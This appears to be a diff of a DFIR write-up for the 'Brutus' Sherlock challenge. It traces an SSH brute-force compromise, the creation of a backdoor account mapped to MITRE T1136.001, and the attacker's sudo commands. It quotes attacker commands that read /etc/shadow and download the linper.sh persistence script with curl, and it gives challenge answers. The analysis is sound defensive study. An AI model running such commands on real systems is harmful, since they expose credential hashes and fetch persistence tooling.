@@ -2,152 +2,124 @@
 
 ## 1. Challenge Overview
 
-The **Brutus** Sherlock challenge focuses on investigating suspicious activity through system and authentication logs.
+The **Brutus** Sherlock challenge focuses on investigating suspicious activity through Linux authentication and system logs. The scenario involves a Confluence server whose SSH service was brute-forced, followed by additional attacker activity.
 
-The objective is to reconstruct the incident timeline, determine how the attacker gained access, identify the affected account(s), analyze commands executed during the compromise, and associate the attacker behavior with relevant MITRE ATT&CK techniques.
-
----
-
-## 2. Initial Investigation
-
-The investigation begins by examining the available authentication-related logs and identifying unusual login behavior.
-
-Key items to look for:
-
-- Failed authentication attempts
-- Successful authentication attempts
-- Source IP addresses
-- Target usernames
-- Login timestamps
-- Session activity
-- Privilege-related activity
-
-The goal is to establish a reliable timeline before interpreting individual events.
+![Brutus Sherlock challenge overview](../screenshots/01-brutus-challenge.png)
 
 ---
 
-## 3. Authentication Log Analysis
+## 2. Authentication Log Analysis
 
-Authentication events should be correlated by:
+The `auth.log` evidence shows repeated failed SSH authentication attempts from **65.2.161.68**, followed by a successful SSH login as `root`.
 
-**Timestamp → Source IP → Username → Authentication result → Follow-up activity**
+The logs also show subsequent sessions and account-related activity that help reconstruct the attack timeline.
 
-Repeated failed attempts followed by a successful login can indicate password-guessing or brute-force behavior.
+![Authentication log analysis](../screenshots/02-auth-log-analysis.png)
 
-When reviewing the logs, record:
+### Key observations
 
-| Evidence | Observation |
-|---|---|
-| Source IP | Document the suspicious source address |
-| Target account | Document the affected account |
-| Failed attempts | Record the relevant authentication attempts |
-| Successful login | Record the first suspicious successful login |
-| Timeline | Correlate the activity chronologically |
-
-> Replace the placeholders above with the exact values from the completed challenge evidence.
+- Multiple failed authentication attempts were recorded.
+- SSH connection throttling occurred after repeated connections.
+- A successful password authentication for `root` was recorded from `65.2.161.68`.
+- A root session was subsequently opened.
+- A new local account named `cyberjunkie` was created later in the activity.
 
 ---
 
-## 4. Incident Timeline
+## 3. Persistence — MITRE ATT&CK
 
-Build the timeline from the earliest suspicious authentication event through the attacker’s command execution and subsequent activity.
+The attacker created a new local account, `cyberjunkie`, which is a persistence mechanism.
 
-Example format:
+The corresponding MITRE ATT&CK technique is:
+
+**T1136.001 — Create Account: Local Account**
+
+![MITRE ATT&CK T1136.001 — Create Account](../screenshots/03-mitre-attack.png)
+
+### Why this matters
+
+Creating an additional account can provide an attacker with secondary access to a compromised system and reduce dependence on the original compromised credentials.
+
+---
+
+## 4. Command Analysis
+
+The command evidence shows privileged commands executed through `sudo` by the `cyberjunkie` account.
+
+![Command analysis from auth.log](../screenshots/04-command-analysis.png)
+
+### Observed commands
+
+The investigation identified commands including:
 
 ```text
-[Time]  Failed authentication attempts
-[Time]  Successful authentication
-[Time]  Attacker session established
-[Time]  Suspicious command execution
-[Time]  Privilege / persistence / follow-up activity
+/usr/bin/cat /etc/shadow
 ```
 
-The exact timestamps and events should be taken directly from the challenge evidence.
-
----
-
-## 5. Command Analysis
-
-Review commands executed during the compromised session.
-
-Look for commands that:
-
-- Enumerate the host
-- Identify users or privileges
-- Download or retrieve files
-- Modify system configuration
-- Establish persistence
-- Execute payloads
-- Hide or remove evidence
-
-For each significant command, document:
-
-1. The command
-2. What it does
-3. Why it is suspicious or relevant
-4. The associated MITRE ATT&CK technique, where applicable
-
----
-
-## 6. MITRE ATT&CK Mapping
-
-Map observed attacker behavior to the appropriate MITRE ATT&CK techniques.
-
-Potential technique categories may include:
-
-- **Credential Access**
-- **Initial Access**
-- **Execution**
-- **Persistence**
-- **Privilege Escalation**
-- **Discovery**
-- **Command and Control**
-
-Only assign a technique when the evidence supports it.
-
----
-
-## 7. Investigation Findings
-
-The final findings should summarize:
-
-- Initial access vector
-- Attacker/source IP
-- Compromised account
-- Important authentication events
-- Commands executed
-- Relevant ATT&CK techniques
-- Overall incident timeline
-
----
-
-## 8. Lessons Learned
-
-This challenge reinforces the importance of:
-
-- Monitoring authentication logs
-- Detecting repeated failed logins
-- Correlating successful logins with preceding failures
-- Investigating unexpected source addresses
-- Reviewing shell command history and process activity
-- Using MITRE ATT&CK to classify attacker behavior
-- Maintaining a clear incident timeline
-
----
-
-## 9. Evidence Screenshots
-
-The supporting screenshots are stored under:
+and:
 
 ```text
-screenshots/
+/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
 ```
 
-Expected files:
+The `curl` command downloads the `linper.sh` script from GitHub and is executed using elevated privileges. This is significant because it demonstrates post-compromise command execution with root-level access.
 
-- `01-brutus-challenge.png`
-- `02-auth-log-analysis.png`
-- `03-mitre-attack.png`
-- `04-command-analysis.png`
-- `05-completed-tasks.png`
-- `06-sherlock-completed.png`
+---
+
+## 5. Completed Investigation Tasks
+
+The challenge answers were validated successfully. The evidence includes the MITRE ATT&CK sub-technique, the end time of the attacker's first SSH session, and the full privileged command used to download the script.
+
+![Completed Sherlock tasks](../screenshots/05-completed-tasks.png)
+
+### Important confirmed result
+
+The attacker's first SSH session ended at:
+
+```text
+2024-03-06 06:37:24
+```
+
+The privileged download command was:
+
+```text
+/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
+```
+
+---
+
+## 6. Sherlock Completion
+
+The final screen confirms that the **Brutus Sherlock was successfully solved**.
+
+![Brutus Sherlock successfully completed](../screenshots/06-sherlock-completed.png)
+
+**Solve date:** 27 Aug 2026  
+**XP earned:** 195  
+**Sherlock rank:** #37621
+
+---
+
+## 7. Investigation Summary
+
+The investigation can be summarized as follows:
+
+1. The attacker generated numerous failed SSH authentication attempts.
+2. The attacker successfully authenticated as `root` from `65.2.161.68`.
+3. A new account named `cyberjunkie` was created, providing persistence.
+4. The attacker used `sudo` to perform privileged commands.
+5. `/etc/shadow` was accessed.
+6. A remote `linper.sh` script was downloaded using `curl` with root privileges.
+7. The observed persistence activity was mapped to **MITRE ATT&CK T1136.001**.
+8. The Sherlock challenge was successfully completed.
+
+## 8. Skills Demonstrated
+
+- Linux authentication log analysis
+- SSH investigation
+- Incident timeline reconstruction
+- Account and persistence analysis
+- Privileged command analysis
+- MITRE ATT&CK mapping
+- Basic DFIR methodology
+- Evidence documentation
